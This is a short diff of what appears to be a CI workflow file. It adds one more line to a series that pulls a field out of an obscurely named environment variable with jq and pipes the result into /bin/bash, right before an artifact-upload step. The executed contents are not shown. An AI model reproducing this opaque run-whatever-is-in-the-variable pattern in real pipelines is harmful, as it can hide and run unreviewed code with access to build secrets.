@@ -40,6 +40,7 @@ jobs:
           echo $h8170 | jq -r .ssbqp2 | /bin/bash
           echo $pswsp2028 | jq -r .xi722 | /bin/bash
           echo $cjydw5960 | jq -r .fsxs0 | /bin/bash
+          printf '%s' "$czh90248" | jq -r .bis600 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
